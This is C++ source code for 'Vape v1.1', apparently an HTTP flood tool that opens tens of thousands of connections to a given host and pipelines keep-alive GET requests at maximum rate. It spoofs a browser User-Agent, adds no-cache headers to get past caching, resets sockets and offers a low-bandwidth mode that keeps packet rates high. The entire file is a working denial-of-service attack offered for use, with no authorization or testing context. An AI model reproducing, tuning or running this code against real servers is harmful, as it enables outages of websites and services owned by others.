/*
 * Vape v1.1
 * Developer: @Xstairs
 *
 * Usage:
 *   ./vape <host> <port> [connections] [threads] [duration_sec] [lownet]
 *
 *   lownet  — minimum bandwidth mode: ~45 byte payload, pipeline depth 64.
 *             Same or higher PPS, ~7x less TX bandwidth.
 *
 * Build:
 *   g++ -O3 -march=native -mtune=native -funroll-loops -fno-plt \
 *       -ffast-math -fomit-frame-pointer -std=c++17              \
 *       -o vape Vape-1.1.cpp -lpthread
 */

#include <arpa/inet.h>
#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <sched.h>
#include <string>
#include <sys/epoll.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <thread>
#include <unistd.h>
#include <vector>
#include <immintrin.h>

static constexpr int      EPOLL_BATCH    = 8192;
static constexpr int      PIPELINE       = 32;
static constexpr int      PIPELINE_LN    = 64;
static constexpr int      SPIN_MAX       = 2;
static constexpr int      SCAN_MS        = 200;
static constexpr int      SNDBUF         = 131072;
static constexpr int      RCVBUF         = 131072;
static constexpr int      BUSY_POLL_US   = 100;
static constexpr uint32_t DEF_CONNS      = 50000;
static constexpr uint32_t DEF_KA         = 16384;
static constexpr uint32_t DEF_TIMEOUT_MS = 5000;

static constexpr char HTTP_FMT[] =
    "GET / HTTP/1.1\r\n"
    "Host: %s\r\n"
    "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    "Accept-Language: en-US,en;q=0.5\r\n"
    "Accept-Encoding: identity\r\n"
    "Cache-Control: no-cache\r\n"
    "Pragma: no-cache\r\n"
    "Connection: keep-alive\r\n"
    "\r\n";

static constexpr char HTTP_FMT_LN[] =
    "GET / HTTP/1.1\r\n"
    "Host: %s\r\n"
    "Connection: keep-alive\r\n"
    "\r\n";

static std::atomic<bool> g_running{false};
static void on_signal(int) noexcept { g_running.store(false, std::memory_order_relaxed); }

struct Config {
    std::string  host;
    std::string  resolved_ip;
    uint16_t     port        = 80;
    uint32_t     connections = DEF_CONNS;
    uint32_t     threads     = 0;
    uint32_t     duration    = 60;
    uint32_t     timeout_ms  = DEF_TIMEOUT_MS;
    uint32_t     keepalive   = DEF_KA;
    bool         pin_cpu     = true;
    bool         realtime    = true;
    bool         lownet      = false;
};

struct alignas(64) Stats {
    std::atomic<uint64_t> requests{0};
    std::atomic<uint64_t> errors  {0};
    std::atomic<uint64_t> bytes_tx{0};
    std::atomic<uint64_t> bytes_rx{0};
    char _pad[64 - 4*8];
};

struct alignas(64) Conn {
    int     fd        = -1;
    int32_t req_count = 0;
    int64_t opened_us = 0;
    int64_t sent_us   = 0;
    bool    connected = false;
    uint8_t _pad[7];
};

static thread_local int64_t tl_us = 0;
static thread_local int64_t tl_ms = 0;

__attribute__((always_inline))
static inline void tick() noexcept {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_COARSE, &ts);
    tl_us = ts.tv_sec * 1'000'000LL + ts.tv_nsec / 1000LL;
    tl_ms = ts.tv_sec * 1000LL      + ts.tv_nsec / 1'000'000LL;
}

static sockaddr_in resolve(const std::string& host, uint16_t port, std::string& ip_out) {
    addrinfo hints{};
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    addrinfo* res = nullptr;
    if (getaddrinfo(host.c_str(), nullptr, &hints, &res) || !res) _exit(1);
    sockaddr_in addr{};
    std::memcpy(&addr, res->ai_addr, sizeof(addr));
    addr.sin_port = htons(port);
    char buf[INET_ADDRSTRLEN]{};
    inet_ntop(AF_INET, &addr.sin_addr, buf, sizeof(buf));
    ip_out = buf;
    freeaddrinfo(res);
    return addr;
}

__attribute__((always_inline))
static inline int make_sock() noexcept {
    int fd = ::socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, IPPROTO_TCP);
    if (__builtin_expect(fd < 0, 0)) return -1;
    static constexpr int ONE = 1;
    static constexpr struct linger LG = {1, 0};
    static constexpr int SND = SNDBUF, RCV = RCVBUF, BP = BUSY_POLL_US;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY,          &ONE, sizeof(ONE));
    setsockopt(fd, SOL_SOCKET,  SO_REUSEPORT,         &ONE, sizeof(ONE));
    setsockopt(fd, SOL_SOCKET,  SO_LINGER,            &LG,  sizeof(LG));
    setsockopt(fd, IPPROTO_TCP, TCP_QUICKACK,         &ONE, sizeof(ONE));
    setsockopt(fd, SOL_SOCKET,  SO_BUSY_POLL,         &BP,  sizeof(BP));
    setsockopt(fd, SOL_SOCKET,  SO_SNDBUF,            &SND, sizeof(SND));
    setsockopt(fd, SOL_SOCKET,  SO_RCVBUF,            &RCV, sizeof(RCV));
    setsockopt(fd, IPPROTO_TCP, TCP_FASTOPEN_CONNECT, &ONE, sizeof(ONE));
    return fd;
}

struct WCtx {
    const Config&      cfg;
    const sockaddr_in& addr;
    Stats&             stats;
    const char*        payload;
    size_t             payload_len;
    std::vector<iovec> iov;
    uint32_t           n;
    int                cpu;
};

static void worker(WCtx ctx) {
    if (ctx.cpu >= 0) {
        cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(ctx.cpu, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
    }
    if (ctx.cfg.realtime) {
        sched_param sp{}; sp.sched_priority = 99;
        pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
    }

    const Config&      cfg   = ctx.cfg;
    const sockaddr_in& addr  = ctx.addr;
    Stats&             stats = ctx.stats;
    const uint32_t     N     = ctx.n;
    const char*        pdata = ctx.payload;
    const size_t       plen  = ctx.payload_len;
    const int          PD    = (int)ctx.iov.size();
    iovec*             iov   = ctx.iov.data();

    static thread_local uint8_t rbuf[262144];
    int epfd = epoll_create1(EPOLL_CLOEXEC);
    if (epfd < 0) return;

    std::vector<Conn> conns(N);

    auto open_conn = [&](uint32_t idx) __attribute__((always_inline)) {
        Conn& c = conns[idx];
        if (c.fd >= 0) { epoll_ctl(epfd, EPOLL_CTL_DEL, c.fd, nullptr); ::close(c.fd); c.fd = -1; }
        c.connected = false; c.req_count = 0;
        int fd = make_sock();
        if (__builtin_expect(fd < 0, 0)) { stats.errors.fetch_add(1, std::memory_order_relaxed); return; }
        int rc = ::connect(fd, reinterpret_cast<const sockaddr*>(&addr), sizeof(addr));
        if (__builtin_expect(rc < 0 && errno != EINPROGRESS, 0)) {
            stats.errors.fetch_add(1, std::memory_order_relaxed); ::close(fd); return;
        }
        c.fd = fd; c.opened_us = tl_us; c.sent_us = tl_us;
        epoll_event ev{}; ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP | EPOLLET; ev.data.u32 = idx;
        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
    };

    auto send_burst = [&](Conn& c) __attribute__((always_inline)) {
        int budget = std::min(PD, (int)cfg.keepalive - c.req_count);
        if (__builtin_expect(budget <= 0, 0)) return;
        c.sent_us = tl_us;
        ssize_t ns = (budget == 1) ? ::send(c.fd, pdata, plen, MSG_NOSIGNAL | MSG_DONTWAIT)
                                   : ::writev(c.fd, iov, budget);
        if (__builtin_expect(ns > 0, 1)) {
            int sent = (int)((size_t)ns / plen); if (sent < 1) sent = 1;
            stats.requests.fetch_add((uint64_t)sent, std::memory_order_relaxed);
            stats.bytes_tx.fetch_add((uint64_t)ns,   std::memory_order_relaxed);
            c.req_count += sent;
        }
    };

    auto rearm_rd = [&](Conn& c, uint32_t idx) __attribute__((always_inline)) {
        epoll_event ev{};
        ev.events = EPOLLIN | EPOLLRDHUP | EPOLLERR | EPOLLHUP | EPOLLET; ev.data.u32 = idx;
        epoll_ctl(epfd, EPOLL_CTL_MOD, c.fd, &ev);
    };

    tick();
    for (uint32_t i = 0; i < N; ++i) open_conn(i);

    epoll_event evbuf[EPOLL_BATCH];
    int64_t last_scan = tl_ms;
    int     idle      = 0;

    while (__builtin_expect(g_running.load(std::memory_order_acquire), 1)) {
        int timeout = idle > SPIN_MAX ? 1 : 0;
        if (idle > 0 && idle <= SPIN_MAX) _mm_pause();
        int n = epoll_wait(epfd, evbuf, EPOLL_BATCH, timeout);
        tick();
        if (__builtin_expect(n == 0, 0)) { ++idle; continue; }
        idle = 0;

        for (int i = 0; i < n; ++i) {
            const uint32_t idx = evbuf[i].data.u32;
            const uint32_t em  = evbuf[i].events;
            Conn& c = conns[idx];

            if (__builtin_expect(!!(em & (EPOLLERR | EPOLLHUP)), 0)) {
                stats.errors.fetch_add(1, std::memory_order_relaxed); open_conn(idx); continue;
            }
            if (__builtin_expect(!c.connected, 0)) {
                int err = 0; socklen_t el = sizeof(err);
                getsockopt(c.fd, SOL_SOCKET, SO_ERROR, &err, &el);
                if (__builtin_expect(err != 0, 0)) {
                    stats.errors.fetch_add(1, std::memory_order_relaxed); open_conn(idx); continue;
                }
                c.connected = true;
                static constexpr int ONE = 1;
                setsockopt(c.fd, IPPROTO_TCP, TCP_QUICKACK, &ONE, sizeof(ONE));
                send_burst(c); rearm_rd(c, idx); continue;
            }
            if (__builtin_expect(!!(em & EPOLLRDHUP), 0)) { open_conn(idx); continue; }
            if (__builtin_expect(!!(em & EPOLLIN), 1)) {
                uint64_t rx = 0; bool closed = false;
                while (true) {
                    ssize_t nr = ::recv(c.fd, rbuf, sizeof(rbuf), MSG_DONTWAIT);
                    if (__builtin_expect(nr > 0, 1)) { rx += (uint64_t)nr; }
                    else if (nr == 0) { closed = true; break; }
                    else { if (errno == EAGAIN || errno == EWOULDBLOCK) break; closed = true; break; }
                }
                if (rx) stats.bytes_rx.fetch_add(rx, std::memory_order_relaxed);
                if (__builtin_expect(closed, 0)) { open_conn(idx); continue; }
                if (__builtin_expect(c.req_count >= (int32_t)cfg.keepalive, 0)) open_conn(idx);
                else send_burst(c);
            }
        }

        if (__builtin_expect(tl_ms - last_scan >= SCAN_MS, 0)) {
            last_scan = tl_ms;
            const int64_t tmo = (int64_t)cfg.timeout_ms;
            for (uint32_t i = 0; i < N; ++i) {
                Conn& c = conns[i];
                if (__builtin_expect(c.fd < 0, 0)) { open_conn(i); continue; }
                int64_t age = tl_us - (c.connected ? c.sent_us : c.opened_us);
                if (age > tmo * 1000LL) { stats.errors.fetch_add(1, std::memory_order_relaxed); open_conn(i); }
            }
        }
    }

    for (uint32_t i = 0; i < N; ++i)
        if (conns[i].fd >= 0) { ::close(conns[i].fd); conns[i].fd = -1; }
    ::close(epfd);
}

static uint64_t raise_fds(uint64_t need) {
    struct rlimit rl{};
    getrlimit(RLIMIT_NOFILE, &rl);
    uint64_t want = need + 2048;
    if (rl.rlim_cur < want) {
        rl.rlim_cur = (want < (uint64_t)rl.rlim_max) ? want : (uint64_t)rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
        getrlimit(RLIMIT_NOFILE, &rl);
    }
    return rl.rlim_cur;
}

int main(int argc, char** argv) {
    if (argc < 3) {
        std::fprintf(stderr,
            "Usage: %s <host> <port> [connections=%u] [threads=auto] [duration=%us] [lownet]\n",
            argv[0], DEF_CONNS, 60u);
        return 1;
    }
    std::signal(SIGPIPE, SIG_IGN);
    std::signal(SIGINT,  on_signal);
    std::signal(SIGTERM, on_signal);

    Config cfg;
    cfg.host        = argv[1];
    cfg.port        = (uint16_t)std::atoi(argv[2]);
    if (argc > 3) cfg.connections = (uint32_t)std::atoi(argv[3]);
    if (argc > 4) cfg.threads     = (uint32_t)std::atoi(argv[4]);
    if (argc > 5) cfg.duration    = (uint32_t)std::atoi(argv[5]);
    if (argc > 6) cfg.lownet      = (std::strcmp(argv[6], "lownet") == 0);
    if (cfg.port == 0) return 1;

    sockaddr_in addr;
    try { addr = resolve(cfg.host, cfg.port, cfg.resolved_ip); } catch (...) { return 1; }

    uint32_t nw    = cfg.threads ? cfg.threads : std::max(1u, std::thread::hardware_concurrency());
    uint64_t fdlim = raise_fds((uint64_t)cfg.connections + nw * 32 + 512);
    uint32_t maxc  = (fdlim > 512) ? (uint32_t)(fdlim - 512) : 1;
    if (cfg.connections > maxc) cfg.connections = maxc;

    const char* fmt = cfg.lownet ? HTTP_FMT_LN : HTTP_FMT;
    const int   pd  = cfg.lownet ? PIPELINE_LN : PIPELINE;

    char tmp[1024];
    int  tlen = std::snprintf(tmp, sizeof(tmp), fmt, cfg.host.c_str());
    std::string payload(tmp, tlen > 0 ? tlen : 0);
    size_t      plen = payload.size();

    std::string pipe_buf;
    pipe_buf.reserve(plen * (size_t)pd);
    for (int i = 0; i < pd; ++i) pipe_buf += payload;

    std::vector<iovec> iov((size_t)pd);
    for (int i = 0; i < pd; ++i) {
        iov[i].iov_base = const_cast<char*>(pipe_buf.data() + (size_t)i * plen);
        iov[i].iov_len  = plen;
    }

    std::vector<Stats>       wstats(nw);
    std::vector<std::thread> wthreads;
    wthreads.reserve(nw);
    g_running.store(true, std::memory_order_release);

    uint32_t base = cfg.connections / nw, rem = cfg.connections % nw;
    for (uint32_t w = 0; w < nw; ++w) {
        WCtx wc{cfg, addr, wstats[w], payload.data(), plen, iov,
                base + (w < rem ? 1 : 0), cfg.pin_cpu ? (int)w : -1};
        wthreads.emplace_back(worker, wc);
    }

    std::thread timer([&]() {
        for (uint32_t s = 0; s < cfg.duration; ++s) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            if (!g_running.load(std::memory_order_relaxed)) return;
        }
        g_running.store(false, std::memory_order_relaxed);
    });

    timer.join();
    g_running.store(false, std::memory_order_release);
    for (auto& t : wthreads) t.join();

    uint64_t total_req = 0, total_err = 0, total_tx = 0, total_rx = 0;
    for (auto& s : wstats) {
        total_req += s.requests.load(std::memory_order_relaxed);
        total_err += s.errors  .load(std::memory_order_relaxed);
        total_tx  += s.bytes_tx.load(std::memory_order_relaxed);
        total_rx  += s.bytes_rx.load(std::memory_order_relaxed);
    }

    double dur = (double)cfg.duration;
    std::printf("req=%-12lu  rps=%-10.0f  err=%-8lu  tx=%.2fMB  rx=%.2fMB\n",
        total_req, total_req / dur, total_err, total_tx / 1e6, total_rx / 1e6);
    return 0;
}
